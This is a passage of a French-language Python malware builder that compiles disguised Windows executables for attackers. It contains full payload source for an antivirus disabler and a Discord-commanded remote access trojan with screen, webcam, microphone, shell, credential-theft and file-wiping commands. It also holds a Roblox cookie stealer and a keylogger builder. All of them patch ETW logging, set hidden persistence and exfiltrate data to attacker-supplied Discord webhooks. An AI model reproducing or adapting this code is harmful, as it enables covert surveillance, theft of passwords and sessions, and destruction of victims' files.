    if not WEBHOOK or not WEBHOOK.startswith("http"):
        return
    import requests
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except Exception:
        ip = "?"
    try:
        user = os.getlogin()
    except Exception:
        user = "?"
    embed = {
        "title": "AV Disabler Report",
        "color": 0xFFFFFF,
        "fields": [
            {"name": "Hostname", "value": f"`{socket.gethostname()}`", "inline": True},
            {"name": "User", "value": f"`{user}`", "inline": True},
            {"name": "OS", "value": f"{platform.system()} {platform.release()}", "inline": True},
            {"name": "IP", "value": f"`{ip}`", "inline": True},
            {"name": "Cibles", "value": "`" + ", ".join(targets) + "`", "inline": False},
            {"name": "Timestamp", "value": datetime.now().isoformat(), "inline": False},
        ]
    }
    try:
        requests.post(WEBHOOK, json={"embeds": [embed]}, timeout=10)
    except Exception:
        pass

def main():
    if not is_admin():
        if elevate():
            sys.exit(0)
        else:
            sys.exit(1)

    targets = __TARGET_LIST__

    for t in targets:
        fn = globals().get(f"disable_{t}")
        if callable(fn):
            try:
                fn()
            except Exception:
                pass

    report(targets)

if __name__ == "__main__":
    main()
'''

    targets_repr = repr(clefs)
    src = source.replace("__TARGET_LIST__", targets_repr)
    src = src.replace("__TARGETS__", ", ".join(noms))
    src = src.replace("__WEBHOOK_URL__", webhook if send_report else "")

    tmp = _safe_tmp("_avdisable_tmp.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_avdisable")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", "av_disable",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=requests",
        "--uac-admin",
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]
    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, "av_disable.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{CYAN}[i] Cibles : {', '.join(noms)}{RESET}")
    if send_report:
        print(f"{GRAY}[i] Report Discord active.{RESET}")

    for p in [tmp, os.path.join(spec_dir, "av_disable.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


def option_12():
    clear()
    banner()

    print(f"\n{CYAN}   [ RAT BUILDER — Discord backend ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL (reception) -> ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook invalide.{RESET}")
        pause()
        return

    bot_token = input(f"{YELLOW}[?]{RESET} Bot token (commandes) -> ").strip()
    channel_id = input(f"{YELLOW}[?]{RESET} Channel ID (commandes) -> ").strip()
    if not bot_token or not channel_id:
        print(f"{RED}[!] Bot token ou channel ID manquant.{RESET}")
        pause()
        return

    icon = input(f"{YELLOW}[?]{RESET} Chemin .ico (vide = aucun) -> ").strip() or None
    output = input(f"{YELLOW}[?]{RESET} Nom de sortie (ex: svchost) -> ").strip() or "svchost"

    bot_source = r'''import os, sys, json, time, base64, zipfile, tempfile, subprocess, shutil
import socket, platform, getpass, ctypes
from datetime import datetime

WEBHOOK = "__WEBHOOK__"
BOT_TOKEN = "__BOT_TOKEN__"
CHANNEL_ID = "__CHANNEL_ID__"
API = "https://discord.com/api/v10"
HEADERS = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
POLL_INTERVAL = 5
SEEN_IDS = set()
BOT_ID = platform.node() + "-" + getpass.getuser()

def patch_etw():
    try:
        k = ctypes.windll.kernel32
        addr = ctypes.cast(k.GetProcAddress(k.GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite"), ctypes.c_void_p)
        old = ctypes.c_ulong(0)
        k.VirtualProtect(addr, 0x10, 0x40, ctypes.byref(old))
        ctypes.memmove(addr, b"\xB8\x00\x00\x00\xC0\xC3", 6)
        k.VirtualProtect(addr, 0x10, old.value, ctypes.byref(old))
    except Exception:
        pass

patch_etw()

try:
    import requests
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "requests"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
    import requests

HTTP = requests.Session()
HTTP.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})

def wh_send(content=None, embed=None, file_path=None):
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path, "rb") as f:
                HTTP.post(WEBHOOK, files={"file": (os.path.basename(file_path), f.read())},
                          data={"content": content or ""}, timeout=60)
        elif embed:
            HTTP.post(WEBHOOK, json={"embeds": [embed]}, timeout=15)
        elif content:
            HTTP.post(WEBHOOK, json={"content": content[:1900]}, timeout=15)
    except Exception:
        pass

def wh_embed(title, description, color=0xFFFFFF, fields=None):
    e = {"title": title, "description": description[:4000], "color": color,
         "timestamp": datetime.utcnow().isoformat()}
    if fields:
        e["fields"] = fields
    try:
        HTTP.post(WEBHOOK, json={"embeds": [e]}, timeout=15)
    except Exception:
        pass

def fetch_msgs():
    try:
        r = HTTP.get(f"{API}/channels/{CHANNEL_ID}/messages?limit=5",
                     headers=HEADERS, timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return []

def get_sysinfo():
    try:
        ip = HTTP.get("https://api.ipify.org", timeout=5).text
    except Exception:
        ip = "?"
    try:
        user = os.getlogin()
    except Exception:
        user = "?"
    return {
        "hostname": socket.gethostname(),
        "username": user,
        "os": platform.system() + " " + platform.release(),
        "arch": platform.machine(),
        "ip": ip,
        "cwd": os.getcwd(),
        "pid": os.getpid(),
        "timestamp": datetime.now().isoformat(),
    }

def cmd_info():
    i = get_sysinfo()
    fields = [{"name": k, "value": f"`{v}`", "inline": True} for k, v in i.items()]
    wh_embed(f"Info — {BOT_ID}", "System info", 0xFFFFFF, fields)

def cmd_screen():
    try:
        import mss, mss.tools
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1])
            tmp = tempfile.mktemp(suffix=".png")
            mss.tools.to_png(img.rgb, img.size, output=tmp)
            wh_send(file_path=tmp, content=f"**Screen** — {BOT_ID}")
            os.remove(tmp)
    except Exception as e:
        wh_send(content=f"[screen] {e}")

def cmd_webcam():
    try:
        import cv2
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            wh_send(content="[webcam] pas de camera")
            return
        tmp = tempfile.mktemp(suffix=".jpg")
        cv2.imwrite(tmp, frame)
        wh_send(file_path=tmp, content=f"**Webcam** — {BOT_ID}")
        os.remove(tmp)
    except Exception as e:
        wh_send(content=f"[webcam] {e}")

def cmd_micro(seconds=10):
    try:
        import sounddevice as sd
        import scipy.io.wavfile as wav
        fs = 44100
        rec = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
        sd.wait()
        tmp = tempfile.mktemp(suffix=".wav")
        wav.write(tmp, fs, rec)
        wh_send(file_path=tmp, content=f"**Micro {seconds}s** — {BOT_ID}")
        os.remove(tmp)
    except Exception as e:
        wh_send(content=f"[micro] {e}")

def cmd_shell(arg):
    try:
        r = subprocess.run(arg, shell=True, capture_output=True, text=True, timeout=60)
        out = (r.stdout + r.stderr)[:4000] or "[pas de sortie]"
        wh_embed("Shell", f"```\n{out}\n```", 0xFFFFFF,
                 [{"name": "cmd", "value": f"`{arg[:200]}`", "inline": False}])
    except Exception as e:
        wh_send(content=f"[shell] {e}")

def cmd_creds():
    import sqlite3, win32crypt
    out = []
    paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"),
    ]
    for p in paths:
        if not os.path.exists(p):
            continue
        tmp = tempfile.mktemp()
        try:
            shutil.copy2(p, tmp)
            con = sqlite3.connect(tmp)
            for url, user, enc in con.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 50"):
                try:
                    pwd = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode()
                except Exception:
                    pwd = "<enc>"
                out.append(f"{url[:80]} | {user} | {pwd}")
            con.close()
        except Exception:
            pass
        finally:
            try: os.remove(tmp)
            except: pass
    try:
        r = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
        for line in r.stdout.splitlines():
            if "All User Profile" in line:
                name = line.split(":")[1].strip()
                r2 = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True, text=True)
                for l2 in r2.stdout.splitlines():
                    if "Key Content" in l2:
                        out.append(f"[WiFi] {name} | {l2.split(':', 1)[1].strip()}")
    except Exception:
        pass
    if out:
        tmp = tempfile.mktemp(suffix=".txt")
        with open(tmp, "w", encoding="utf-8") as f:
            f.write("\n".join(out))
        wh_send(file_path=tmp, content=f"**Creds** — {BOT_ID}")
        os.remove(tmp)
    else:
        wh_send(content="[creds] rien")

def cmd_files():
    user = os.path.expanduser("~")
    tmp = tempfile.mktemp(suffix=".zip")
    total = 0
    with zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as z:
        for f in ["Documents", "Desktop", "Downloads"]:
            base = os.path.join(user, f)
            if not os.path.isdir(base):
                continue
            for root, _, files in os.walk(base):
                for name in files:
                    fp = os.path.join(root, name)
                    try:
                        sz = os.path.getsize(fp)
                        if sz < 10 * 1024 * 1024 and total + sz < 50 * 1024 * 1024:
                            z.write(fp, os.path.relpath(fp, user))
                            total += sz
                    except Exception:
                        pass
    if total > 0:
        wh_send(file_path=tmp, content=f"**Files** ({total // 1024 // 1024} MB) — {BOT_ID}")
    else:
        wh_send(content="[files] rien")
    try: os.remove(tmp)
    except: pass

def cmd_delete():
    import shutil as sh
    user = os.path.expanduser("~")
    for f in ["Documents", "Desktop", "Downloads", "Pictures"]:
        try:
            sh.rmtree(os.path.join(user, f), ignore_errors=True)
        except Exception:
            pass
    wh_send(content=f"**Files deleted** — {BOT_ID}")

def cmd_persist():
    try:
        import winreg
        exe_path = sys.executable
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(k)
        wh_send(content=f"**Persistence OK** — {BOT_ID}")
    except Exception as e:
        wh_send(content=f"[persist] {e}")

def cmd_pwd():
    wh_send(content=f"**CWD** : `{os.getcwd()}` — {BOT_ID}")

def cmd_listdir(arg):
    try:
        path = arg.strip() or os.path.expanduser("~")
        items = os.listdir(path)
        listing = "\n".join(items[:100])
        wh_embed("Dir listing", f"```\n{listing}\n```", 0xFFFFFF,
                 [{"name": "path", "value": f"`{path}`", "inline": False}])
    except Exception as e:
        wh_send(content=f"[listdir] {e}")

def cmd_download(arg):
    path = arg.strip()
    if not os.path.isfile(path):
        wh_send(content=f"[download] not a file: {path}")
        return
    size = os.path.getsize(path)
    if size > 25 * 1024 * 1024:
        wh_send(content=f"[download] trop gros ({size // 1024 // 1024} MB)")
        return
    wh_send(file_path=path, content=f"**Download** {os.path.basename(path)} — {BOT_ID}")

def cmd_upload(url):
    try:
        tmp = tempfile.mktemp(suffix=os.path.basename(url.split("?")[0]) or ".bin")
        r = HTTP.get(url, timeout=60, stream=True)
        with open(tmp, "wb") as f:
            for chunk in r.iter_content(8192):
                f.write(chunk)
        wh_send(content=f"**Upload OK** : `{tmp}` — {BOT_ID}")
    except Exception as e:
        wh_send(content=f"[upload] {e}")

def cmd_lock():
    try:
        ctypes.windll.user32.LockWorkStation()
        wh_send(content=f"**Locked** — {BOT_ID}")
    except Exception as e:
        wh_send(content=f"[lock] {e}")

def cmd_message(text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "Message", 0x40)
        wh_send(content=f"**Message affiche** — {BOT_ID}")
    except Exception as e:
        wh_send(content=f"[message] {e}")

def cmd_kill():
    wh_send(content=f"**Exit** — {BOT_ID}")
    os._exit(0)

def dispatch(cmd):
    parts = cmd.strip().split(" ", 1)
    base = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    table = {
        "!info": cmd_info,
        "!screen": cmd_screen,
        "!webcam": cmd_webcam,
        "!micro": cmd_micro,
        "!creds": cmd_creds,
        "!files": cmd_files,
        "!delete": cmd_delete,
        "!persist": cmd_persist,
        "!pwd": cmd_pwd,
        "!lock": cmd_lock,
        "!kill": cmd_kill,
        "!ping": lambda: wh_send(content=f"**Pong** — {BOT_ID}"),
    }

    if base == "!shell":
        cmd_shell(arg)
    elif base == "!listdir":
        cmd_listdir(arg)
    elif base == "!download":
        cmd_download(arg)
    elif base == "!upload":
        cmd_upload(arg)
    elif base == "!message":
        cmd_message(arg)
    elif base in table:
        try:
            table[base]()
        except Exception as e:
            wh_send(content=f"[{base}] {e}")
    else:
        wh_send(content=f"[?] commande inconnue : `{cmd}`")

def main():
    try:
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}"')
            winreg.CloseKey(k)
        except Exception:
            pass

        wh_embed(f"Online — {BOT_ID}",
                 "RAT Discord backend connecte",
                 0xFFFFFF,
                 [{"name": k, "value": f"`{v}`", "inline": True} for k, v in get_sysinfo().items()])

        while True:
            msgs = fetch_msgs()
            for m in reversed(msgs):
                mid = m.get("id")
                content = m.get("content", "").strip()
                if mid in SEEN_IDS or not content.startswith("!"):
                    continue
                SEEN_IDS.add(mid)
                try:
                    dispatch(content)
                except Exception as e:
                    wh_send(content=f"[dispatch] {e}")
            time.sleep(POLL_INTERVAL)
    except Exception as e:
        wh_send(content=f"[main] {e}")

if __name__ == "__main__":
    if os.name != "nt":
        sys.exit(1)
    main()
'''

    src = bot_source.replace("__WEBHOOK__", webhook)
    src = src.replace("__BOT_TOKEN__", bot_token)
    src = src.replace("__CHANNEL_ID__", channel_id)

    bot_path = _safe_tmp("bot.py")
    with open(bot_path, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_rat")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", output,
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=requests",
        "--hidden-import=mss",
        "--hidden-import=cv2",
        "--hidden-import=sounddevice",
        "--hidden-import=scipy.io.wavfile",
        "--hidden-import=win32crypt",
        "--runtime-tmpdir", "%TEMP%",
    ]
    if icon:
        args += ["--icon", icon]
    args.append(bot_path)

    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, f"{output}.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{GRAY}[i] Envoie {output}.exe a la cible.{RESET}")
    print(f"{GRAY}[i] Commandes disponibles dans le channel Discord :{RESET}")
    print(f"{CYAN}    !info  !screen  !webcam  !micro  !creds  !files{RESET}")
    print(f"{CYAN}    !delete  !persist  !pwd  !shell <cmd>  !listdir <path>{RESET}")
    print(f"{CYAN}    !download <path>  !upload <url>  !message <txt>{RESET}")
    print(f"{CYAN}    !lock  !kill  !ping{RESET}")

    for p in [bot_path, os.path.join(spec_dir, f"{output}.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


def option_13():
    clear()
    banner()

    print(f"\n{CYAN}   [ ROBLOX COOKIE GRABBER BUILDER ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL -> ").strip()
    
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook Discord invalide.{RESET}")
        pause()
        return

    # Le payload simplifie : vole les cookies Chrome/Edge/Brave et envoie au webhook
    payload = f'''import os, sys, json, base64, sqlite3, shutil, tempfile
import subprocess, ctypes
from datetime import datetime

try:
    import requests
except ImportError:
    subprocess.call([sys.executable, "-m", "pip", "install", "requests", "--quiet"])
    import requests

try:
    from Crypto.Cipher import AES
except ImportError:
    subprocess.call([sys.executable, "-m", "pip", "install", "pycryptodome", "--quiet"])
    from Crypto.Cipher import AES

WEBHOOK_URL = "{webhook}"

# Chemins des bases de donnees Chromium
BROWSERS = {{
    "Chrome": os.path.join(os.getenv("LOCALAPPDATA", ""), r"Google\\Chrome\\User Data"),
    "Edge": os.path.join(os.getenv("LOCALAPPDATA", ""), r"Microsoft\\Edge\\User Data"),
    "Brave": os.path.join(os.getenv("LOCALAPPDATA", ""), r"BraveSoftware\\Brave-Browser\\User Data"),
    "Opera": os.path.join(os.getenv("APPDATA", ""), r"Opera Software\\Opera Stable"),
    "Opera GX": os.path.join(os.getenv("APPDATA", ""), r"Opera Software\\Opera GX Stable"),
    "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA", ""), r"Vivaldi\\User Data"),
}}

def dpapi(data):
    try:
        from ctypes import wintypes
        class BLOB(ctypes.Structure):
            _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
        c = ctypes.windll.crypt32
        k = ctypes.windll.kernel32
        bi = BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_char)))
        bo = BLOB()
        if c.CryptUnprotectData(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
            r = ctypes.string_at(bo.pbData, bo.cbData)
            k.LocalFree(bo.pbData)
            return r
    except Exception:
        pass
    return None

def get_master_key(browser_path):
    ls_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(ls_path):
        return None
    try:
        with open(ls_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        return dpapi(enc_key[5:]) # On enleve le prefixe 'DPAPI'
    except Exception:
        return None

def decrypt_cookie(enc_value, master_key):
    try:
        if not enc_value or not master_key:
            return ""
        # Format moderne (v10 / v11)
        if enc_value[:3] in (b"v10", b"v11"):
            iv = enc_value[3:15]
            payload = enc_value[15:-16]
            tag = enc_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode("utf-8", errors="ignore")
        # Format ancien (DPAPI pur)
        else:
            return dpapi(enc_value).decode("utf-8", errors="ignore")
    except Exception:
        return ""

def extract_roblox_cookies(browser_name, browser_path):
    if not os.path.isdir(browser_path):
        return []
    
    master_key = get_master_key(browser_path)
    if not master_key:
        return []

    # On cherche tous les profils (Default, Profile 1, etc.)
    profiles = []
    default_profile = os.path.join(browser_path, "Default")
    if os.path.isdir(default_profile):
        profiles.append(default_profile)
    
    for item in os.listdir(browser_path):
        if item.startswith("Profile ") and os.path.isdir(os.path.join(browser_path, item)):
            profiles.append(os.path.join(browser_path, item))

    results = []
    for profile in profiles:
        # Le fichier Cookies peut etre a la racine ou dans Network/
        cookie_paths = [
            os.path.join(profile, "Network", "Cookies"),
            os.path.join(profile, "Cookies")
        ]
        
        for db_path in cookie_paths:
            if not os.path.exists(db_path):
                continue
            
            # On copie la DB dans TEMP pour eviter les erreurs 'database is locked'
            tmp_db = os.path.join(tempfile.gettempdir(), f"ck_{{os.getpid()}}.db")
            try:
                shutil.copy2(db_path, tmp_db)
                con = sqlite3.connect(tmp_db)
                # On filtre uniquement sur roblox
                query = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox%'"
                for host, name, enc in con.execute(query):
                    val = decrypt_cookie(enc, master_key)
                    if val:
                        results.append({{
                            "browser": browser_name,
                            "host": host,
                            "name": name,
                            "value": val
                        }})
                con.close()
            except Exception:
                pass
            finally:
                try: os.remove(tmp_db)
                except: pass
    
    return results

def main():
    all_cookies = []
    
    # Scan de tous les navigateurs definis
    for name, path in BROWSERS.items():
        if os.path.isdir(path):
            found = extract_roblox_cookies(name, path)
            if found:
                all_cookies.extend(found)
    
    if not all_cookies:
        # Optionnel : on previent le webhook qu'il n'y a rien (pratique pour tester)
        try:
            requests.post(WEBHOOK_URL, json={{
                "content": f"**Roblox Grabber** — Aucun cookie trouve sur `{{os.getenv('COMPUTERNAME', 'Unknown')}}`."
            }}, timeout=10)
        except Exception:
            pass
        return

    # Si on a trouve des cookies, on cree un beau fichier JSON
    tmp_file = os.path.join(tempfile.gettempdir(), "roblox_cookies.json")
    with open(tmp_file, "w", encoding="utf-8") as f:
        json.dump(all_cookies, f, indent=4, ensure_ascii=False)

    # On prepare l'embed Discord pour faire propre
    embed = {{
        "title": "Roblox Cookies Stolen",
        "color": 0xFFFFFF,
        "description": f"**Machine:** `{{os.getenv('COMPUTERNAME', 'Unknown')}}`\\n**Total:** `{{len(all_cookies)}}` cookies trouves.",
        "fields": [
            {{"name": "User", "value": f"`{{os.getenv('USERNAME', 'Unknown')}}`", "inline": True}},
            {{"name": "Time", "value": f"`{{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}`", "inline": True}}
        ]
    }}

    # Envoi au webhook
    try:
        with open(tmp_file, "rb") as f:
            requests.post(
                WEBHOOK_URL, 
                data={{"payload_json": json.dumps({{"embeds": [embed]}})}},
                files={{"file": ("roblox_cookies.json", f, "application/json")}},
                timeout=15
            )
    except Exception:
        pass

if __name__ == "__main__":
    if os.name != "nt":
        sys.exit(1)
    main()
'''

    payload_path = _safe_tmp("roblox_grabber_payload.py")
    with open(payload_path, "w", encoding="utf-8") as f:
        f.write(payload)

    try:
        import PyInstaller  # noqa
    except ImportError:
        subprocess.call([sys.executable, "-m", "pip", "install", "pyinstaller"],
                        cwd=_safe_cwd())

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_roblox")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    subprocess.call([sys.executable, "-m", "PyInstaller", "--onefile",
                     "--noconfirm", "--clean", "--noconsole",
                     "--distpath", dist_dir,
                     "--workpath", work_dir,
                     "--specpath", spec_dir,
                     payload_path],
                    cwd=_safe_cwd())

    exe = os.path.join(dist_dir, "roblox_grabber_payload.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    pause()


def option_14():
    clear()
    banner()

    print(f"\n{CYAN}   [ KEYLOGGER BUILDER ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL -> ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook invalide.{RESET}")
        pause()
        return

    print(f"\n{GRAY}Options de capture :{RESET}")
    print(f"{GRAY}  1. Clavier uniquement{RESET}")
    print(f"{GRAY}  2. Clavier + fenetres actives{RESET}")
    print(f"{GRAY}  3. Clavier + fenetres + presse-papiers{RESET}")
    print(f"{GRAY}  4. Complet (clavier + fenetres + presse-papiers + screenshots){RESET}")
    mode = input(f"{YELLOW}[?]{RESET} Choix (def 2) -> ").strip() or "2"
    if mode not in ("1", "2", "3", "4"):
        mode = "2"

    try:
        interval = int(input(f"{YELLOW}[?]{RESET} Intervalle d'envoi (secondes, def 60) -> ").strip() or "60")
        if interval < 30:
            interval = 30
    except ValueError:
        interval = 60

    payload = r'''import os, sys, time, threading, ctypes, subprocess, tempfile, socket, platform, json
from datetime import datetime

for pkg in ("requests", "pynput", "pyperclip", "mss"):
    try:
        __import__(pkg if pkg != "mss" else "mss")
    except ImportError:
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", pkg],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
        except Exception:
            pass

import requests
from pynput import keyboard

try:
    import pyperclip
except Exception:
    pyperclip = None

try:
    import mss, mss.tools
except Exception:
    mss = None

WEBHOOK = "__WEBHOOK_URL__"
CAPTURE_WINDOWS = __CAP_WINDOWS__
CAPTURE_CLIPBOARD = __CAP_CLIPBOARD__
CAPTURE_SCREENSHOTS = __CAP_SCREENSHOTS__
SEND_INTERVAL = __INTERVAL__
LOG_DIR = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Logs")
LOG_FILE = os.path.join(LOG_DIR, ".winlog.txt")

HTTP = requests.Session()
HTTP.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})

def patch_etw():
    try:
        k = ctypes.windll.kernel32
        addr = ctypes.cast(k.GetProcAddress(k.GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite"), ctypes.c_void_p)
        old = ctypes.c_ulong(0)
        k.VirtualProtect(addr, 0x10, 0x40, ctypes.byref(old))
        ctypes.memmove(addr, b"\xB8\x00\x00\x00\xC0\xC3", 6)
        k.VirtualProtect(addr, 0x10, old.value, ctypes.byref(old))
    except Exception:
        pass

patch_etw()

lock = threading.Lock()
key_buffer = []
window_buffer = []
clip_last = ""

os.makedirs(LOG_DIR, exist_ok=True)
try:
    ctypes.windll.kernel32.SetFileAttributesW(LOG_FILE, 2)
except Exception:
    pass

def hide_log():
    try:
        ctypes.windll.kernel32.SetFileAttributesW(LOG_FILE, 2)
    except Exception:
        pass

def persist_log(entry):
    try:
        with open(LOG_FILE, "a", encoding="utf-8", errors="ignore") as f:
            f.write(entry)
        hide_log()
    except Exception:
        pass

def get_active_window():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value.strip()
    except Exception:
        return ""

def watch_windows():
    if not CAPTURE_WINDOWS:
        return
    last = None
    while True:
        try:
            title = get_active_window()
            if title and title != last:
                with lock:
                    window_buffer.append(f"[{datetime.now().strftime('%H:%M:%S')}] {title}")
                    persist_log(f"\n\n[FENETRE] {title}\n")
                last = title
        except Exception:
            pass
        time.sleep(2)

def watch_clipboard():
    if not CAPTURE_CLIPBOARD or pyperclip is None:
        return
    global clip_last
    while True:
        try:
            txt = pyperclip.paste()
            if txt and txt != clip_last and len(txt) < 5000:
                clip_last = txt
                with lock:
                    window_buffer.append(f"[CLIPBOARD] {txt[:300]}")
                    persist_log(f"\n[CLIP] {txt[:300]}\n")
        except Exception:
            pass
        time.sleep(3)

def normalize_key(key):
    try:
        if hasattr(key, "char") and key.char:
            return key.char
        name = getattr(key, "name", None)
        if name == "space":
            return " "
        if name == "enter":
            return "\n"
        if name == "tab":
            return "\t"
        if name == "backspace":
            return "[BS]"
        if name == "delete":
            return "[DEL]"
        if name == "esc":
            return "[ESC]"
        if name in ("shift", "shift_r", "ctrl_l", "ctrl_r", "alt_l", "alt_r", "cmd", "cmd_r"):
            return ""
        if name:
            return f"[{name.upper()}]"
    except Exception:
        pass
    return ""

def on_press(key):
    try:
        char = normalize_key(key)
        if not char:
            return
        with lock:
            key_buffer.append(char)
            persist_log(char)
    except Exception:
        pass

def capture_screen():
    if mss is None:
        return None
    try:
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1])
            tmp = tempfile.mktemp(suffix=".png")
            mss.tools.to_png(img.rgb, img.size, output=tmp)
            return tmp
    except Exception:
        return None

def send_embed(title, description, color=0xFFFFFF):
    for chunk in [description[i:i+1900] for i in range(0, len(description), 1900)]:
        try:
            HTTP.post(WEBHOOK, json={"embeds": [{
                "title": title,
                "description": chunk,
                "color": color,
                "timestamp": datetime.utcnow().isoformat(),
            }]}, timeout=15)
        except Exception:
            pass

def send_file(path, caption=""):
    try:
        with open(path, "rb") as f:
            HTTP.post(WEBHOOK, files={"file": (os.path.basename(path), f.read())},
                      data={"content": caption}, timeout=60)
    except Exception:
        pass

def system_info():
    try:
        ip = HTTP.get("https://api.ipify.org", timeout=5).text
    except Exception:
        ip = "?"
    try:
        user = os.getlogin()
    except Exception:
        user = "?"
    return {
        "hostname": socket.gethostname(),
        "user": user,
        "os": f"{platform.system()} {platform.release()}",
        "ip": ip,
    }

def flush():
    while True:
        time.sleep(SEND_INTERVAL)
        with lock:
            if not key_buffer and not window_buffer:
                continue
            keys = "".join(key_buffer)
            windows = list(window_buffer)
            key_buffer.clear()
            window_buffer.clear()

        info = system_info()
        header = (
            f"**{info['hostname']}** — `{info['user']}`\n"
            f"{info['os']} — `{info['ip']}`\n"
            f"`{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        )

        if keys:
            send_embed(f"Keystrokes ({len(keys)} chars)", f"{header}\n\n```\n{keys[:1800]}\n```")

        if windows:
            wtext = "\n".join(windows[-30:])
            send_embed("Activité", f"{header}\n\n```\n{wtext[:1800]}\n```", color=0xFFFFFF)

        try:
            log = ""
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    log = f.read()
            if log:
